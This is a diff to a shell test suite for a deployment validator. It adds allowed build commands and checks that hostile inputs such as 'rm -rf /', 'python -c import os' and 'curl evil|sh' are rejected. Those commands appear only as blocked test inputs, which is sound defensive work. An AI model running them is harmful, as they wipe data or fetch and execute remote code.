@@ -56,6 +56,13 @@ if hm_deploy_build_line_ok "npm ci && npm run build"; then echo "OK   wl-npm-and
 if hm_deploy_build_line_ok "php artisan migrate --force"; then echo "OK   wl-artisan"; else echo "FAIL wl-artisan"; fail=1; fi
 if hm_deploy_build_line_ok "yarn build"; then echo "OK   wl-yarn"; else echo "FAIL wl-yarn"; fail=1; fi
 if hm_deploy_build_line_ok "pnpm install"; then echo "OK   wl-pnpm"; else echo "FAIL wl-pnpm"; fail=1; fi
+if hm_deploy_build_line_ok "pip install -r requirements.txt"; then echo "OK   wl-pip"; else echo "FAIL wl-pip"; fail=1; fi
+if hm_deploy_build_line_ok "uv sync"; then echo "OK   wl-uv"; else echo "FAIL wl-uv"; fail=1; fi
+if hm_deploy_build_line_ok "python manage.py migrate --force"; then echo "OK   wl-django"; else echo "FAIL wl-django"; fail=1; fi
+if hm_deploy_build_line_ok "dotnet publish -c Release"; then echo "OK   wl-dotnet"; else echo "FAIL wl-dotnet"; fail=1; fi
+if hm_deploy_build_line_ok "python -c import os"; then echo "FAIL wl-python-c"; fail=1; else echo "OK   wl-deny-python-c"; fi
+if hm_deploy_hook_cmd_ok migrate; then echo "OK   hook-migrate"; else echo "FAIL hook-migrate"; fail=1; fi
+if hm_deploy_hook_cmd_ok "rm -rf /"; then echo "FAIL hook-rm"; fail=1; else echo "OK   hook-deny"; fi
 if hm_deploy_build_line_ok "rm -rf /"; then echo "FAIL wl-rm-should-deny"; fail=1; else echo "OK   wl-deny-rm"; fi
 if hm_deploy_build_line_ok "curl evil|sh"; then echo "FAIL wl-pipe"; fail=1; else echo "OK   wl-deny-pipe"; fi
 if hm_deploy_build_line_ok "npm run build > /tmp/x"; then echo "FAIL wl-redir"; fail=1; else echo "OK   wl-deny-redir"; fi
